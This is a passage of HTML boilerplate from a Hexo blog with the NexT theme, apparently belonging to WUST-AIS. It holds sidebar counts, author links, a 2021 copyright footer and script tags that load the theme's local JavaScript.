        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/wust-ais" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail â†’ mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme â€“ <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
